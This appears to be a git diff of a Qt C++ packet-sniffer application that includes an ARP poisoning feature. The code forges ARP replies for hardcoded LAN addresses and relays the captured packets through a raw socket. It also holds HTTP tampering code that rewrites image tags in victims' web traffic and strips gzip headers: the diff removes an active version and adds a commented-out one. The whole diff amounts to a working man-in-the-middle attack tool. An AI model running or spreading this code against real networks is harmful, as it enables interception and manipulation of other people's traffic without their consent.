@@ -21,7 +21,7 @@ MainWindow::MainWindow(QWidget *parent) :
     sniffer->moveToThread(thread);
 
     QTimer *timer = new QTimer(this);
-    timer->setInterval(50);
+    timer->setInterval(1);
     timer->start(100);
     connect(thread, SIGNAL(started()), sniffer, SLOT(Start()));
     connect(timer, SIGNAL(timeout()), this, SLOT(getNewPackets()));
@@ -32,6 +32,12 @@ MainWindow::MainWindow(QWidget *parent) :
     connect(ui->pb_save, SIGNAL(clicked()), this, SLOT(Save()));
 
 #ifdef __linux__
+    int                  one = 1;
+    const int            *val = &one;
+
+    _socket_arp = socket(PF_INET, SOCK_RAW, IPPROTO_RAW);
+    setsockopt(_socket_arp, IPPROTO_IP, IP_HDRINCL, (char *) val, sizeof(one));
+
     connect(ui->pb_arp, SIGNAL(clicked()), this, SLOT(ArpPoisoning()));
 #endif
 }
@@ -39,6 +45,9 @@ MainWindow::MainWindow(QWidget *parent) :
 MainWindow::~MainWindow()
 {
     delete ui;
+#ifdef __linux__
+    ::close(_socket_arp);
+#endif
 }
 
 void    MainWindow::Clear()
@@ -83,18 +92,26 @@ void    MainWindow::insertPacket(SniffedPacket &packet)
     int i = ui->tableWidget->rowCount();
     ui->tableWidget->insertRow(i);
 
-    insertToIndex(packet.ip_source.c_str(), i, 0);
-    insertToIndex(packet.ip_dest.c_str(), i, 1);
-    insertToIndex(QString::number(packet.size), i, 2);
-    insertToIndex(packet.protocol, i, 3);
-    insertToIndex(packet.info, i, 4);
+    insertToIndex(packet.protocol, packet.ip_source.c_str(), i, 0);
+    insertToIndex(packet.protocol, packet.ip_dest.c_str(), i, 1);
+    insertToIndex(packet.protocol, QString::number(packet.size), i, 2);
+    insertToIndex(packet.protocol, packet.protocol, i, 3);
+    insertToIndex(packet.protocol, packet.info, i, 4);
 
     this->Packets.push_back(&packet);
 }
 
-void    MainWindow::insertToIndex(const QString &str, int row, int col)
+void    MainWindow::insertToIndex(const QString &protocol, const QString &str, int row, int col)
 {
     QTableWidgetItem *item = new QTableWidgetItem(str);
+    
+        if (protocol == "TCP")
+        item->setBackgroundColor(QColor(0, 0, 255, 100));
+    if (protocol == "UDP")
+    item->setBackgroundColor(QColor(255, 0, 0, 100));
+    if (protocol == "ICMP")
+        item->setBackgroundColor(QColor(255, 255, 0, 100));
+        
     item->setFlags(Qt::ItemIsSelectable | Qt::ItemIsEnabled);
     if (col != 4)
         item->setTextAlignment(Qt::AlignCenter);
@@ -131,7 +148,7 @@ void                MainWindow::ToggleSniffer()
         return ;
     }
 
-    DialogInterface win(this);
+    DialogInterface win(this, _ip, _mac);
     win.exec();
 }
 
@@ -226,13 +243,6 @@ void                  MainWindow::Load()
 
 void                MainWindow::ArpPoisoning()
 {
-    mac[0] = 0x60;
-    mac[1] = 0x67;
-    mac[2] = 0x20;
-    mac[3] = 0x1a;
-    mac[4] = 0xc7;
-    mac[5] = 0xd0;
-
     client_t    *client = new client_t;
     client->ip = "192.168.43.123";
     client->mac[0] = 0x60;
@@ -251,8 +261,6 @@ void                MainWindow::ArpPoisoning()
     client->mac[4] = 0xd7;
     client->mac[5] = 0x68;
     client2 = client;
-
-    ip = "192.168.43.32";
 }
 
 void            MainWindow::refreshArp()
@@ -282,7 +290,7 @@ void            MainWindow::refreshArp()
         // From
         std::memcpy(arp->arp_tha, client->mac, 6);
         // By
-        std::memcpy(arp->arp_sha, mac, 6);
+        std::memcpy(arp->arp_sha, _mac, 6);
 
         memcpy(eth->ether_dhost, arp->arp_tha, ETH_ALEN);
         memcpy(eth->ether_shost, arp->arp_sha, ETH_ALEN);
@@ -310,30 +318,18 @@ void            MainWindow::refreshArp()
 
 void    MainWindow::checkArp(SniffedPacket &packet)
 {
+#if __linux__
     if (client1 == NULL || client2 == NULL || !packet.has_ether_hdr)
         return;
 
-    QByteArray array = QByteArray(packet.data + 6, 6);
-    QByteArray array2 = QByteArray(mac, 6);
-
     eth_hdr_t *eth = (eth_hdr_t *) packet.data;
-    if (strncmp(eth->ether_dhost, mac, 6))
+    if (strncmp(eth->ether_dhost, _mac, 6))
         return;
 
-    if (packet.ip_dest == ip || packet.ip_source == ip || !(strncmp(eth->ether_shost, client1->mac) || strncmp(eth->ether_shost, client2->mac)))
+    if (packet.ip_dest == _ip || packet.ip_source == _ip || !(strncmp(eth->ether_shost, client1->mac, 6) || strncmp(eth->ether_shost, client2->mac, 6)))
         return ;
-//    if (!(client1->ip == packet.ip_source && client2->ip == packet.ip_dest) &&
-//            !(client2->ip == packet.ip_source && client1->ip == packet.ip_dest))
-//        return;
 
-    int                  sd;
     struct sockaddr_in   sin;
-    int                  one = 1;
-    const int            *val = &one;
-
-    sd = socket(PF_INET, SOCK_RAW, IPPROTO_RAW);
-    if(sd < 0)
-        return;
 
     IP_HDR  *ip = (IP_HDR *) (packet.data + ETHER_HDR_SIZE);
 
@@ -341,30 +337,42 @@ void    MainWindow::checkArp(SniffedPacket &packet)
     sin.sin_port = 0;
     sin.sin_addr.s_addr = ip->ip_destaddr;
 
-    if (setsockopt(sd, IPPROTO_IP, IP_HDRINCL, (char *) val, sizeof(one)) < 0)
-        return;
+    const char *pdata = packet.data;
+    int psize = packet.size;
 
     // Image replace
-    std::string data(packet.data, packet.size);
-    if (packet.protocol == "TCP" && packet.dport == 80)
-    {
-        std::string tofind("img src=");
-        std::string toreplace("img src=\"http://upload.wikimedia.org/wikipedia/fr/f/fb/C-dans-l'air.png\"");
-        std::size_t index;
+    //    std::string data(packet.data, packet.size);
+    //    if (packet.protocol == "TCP" && packet.sport == 80)
+    //    {
+    //        std::string tofind("img src=\"img/me.jpg\"");
+    //        std::string toreplace("img src=\"img/me.png\"");
+    //        std::size_t index = 0;
 
+    //        while ((index = data.find(tofind, index)) != std::string::npos)
+    //        {
+    //            std::string img(data.c_str() + index, 40);
+    //            qDebug() << "FOUND : " << img.c_str();
+    //            psize += toreplace.length() - tofind.length();
+    //            data.replace(index, tofind.length(), toreplace);
+    //            pdata = data.c_str();
+    //            index += toreplace.length();
+    //        }
 
-        while ((index = data.find(tofind)) != std::string::npos)
-        {
-            packet.size += toreplace.length() - tofind.length();
-            data.replace(index, tofind.length(), toreplace);
-        }
-    }
+    //        tofind = std::string("gzip");
+    //        toreplace = std::string("");
+    //        index = 0;
 
- #ifdef _WIN32
-    sendto(sd, data.c_str(), packet.size, 0, (struct sockaddr *)&sin, sizeof(sin));
-    closesocket(sd);
- #elif __linux__
-    sendto(sd, packet.data + ETHER_HDR_SIZE, packet.size - ETHER_HDR_SIZE, 0, (struct sockaddr *)&sin, sizeof(sin));
-    ::close(sd);
+    //        while ((index = data.find(tofind, index)) != std::string::npos)
+    //        {
+    //            std::string img(data.c_str() + index, 40);
+    //            qDebug() << "FOUND md5: " << img.c_str();
+    //            psize += toreplace.length() - tofind.length();
+    //            data.replace(index, tofind.length(), toreplace);
+    //            pdata = data.c_str();
+    //            index += toreplace.length();
+    //        }
+    //}
+
+    sendto(_socket_arp, pdata + ETHER_HDR_SIZE, psize - ETHER_HDR_SIZE, 0, (struct sockaddr *)&sin, sizeof(sin));
  #endif
 }
